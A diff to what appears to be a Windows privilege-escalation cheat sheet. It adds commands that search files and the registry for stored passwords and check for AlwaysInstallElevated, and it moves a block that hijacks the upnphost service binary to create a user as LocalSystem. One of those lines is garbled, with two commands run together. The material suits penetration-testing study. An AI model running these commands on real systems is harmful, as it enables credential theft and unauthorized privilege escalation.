@@ -8,9 +8,12 @@
   # d: Directories
   # h: Hidden files
   # s: System files
+  
+  dir /s pass == cred == vnc == .config
+  findstr /si password *.xml *.ini *.txt
   ~~~
 
-- network
+- Network
   ~~~sh
   # Show all listening ports
   netstat -aon | find /i "listening" | findstr 127.0.0.1
@@ -42,8 +45,15 @@
 - Windows services
   ~~~sh
   tasklist /svc
+  schtasks /query /fo LIST /v
   # Queries the configuration information for a specified service.
   sc qc <service_name>
+  
+  # Change the upnp service binary
+  sc qc upnphostsc config upnphost binpath= "net user /add"
+  sc config upnphost obj= ".\LocalSystem" password =""
+  net stop upnphost
+  net start upnphost
   ~~~
 
 - check security policy
@@ -83,14 +93,11 @@
   
   reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
   
-  reg query HKLM /f password /t REG_SZ /s [ |clip]
-  reg query HKCU /f password /t REG_SZ /s [ |clip]
-
-  # Change the upnp service binary
-  sc qc upnphostsc config upnphost binpath= "net user /add"
-  sc config upnphost obj= ".\LocalSystem" password =""
-  net stop upnphost
-  net start upnphost
+  reg query HKLM /f password /t REG_SZ /s
+  reg query HKCU /f password /t REG_SZ /s
+  
+  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
   ~~~
 
 - search credentials
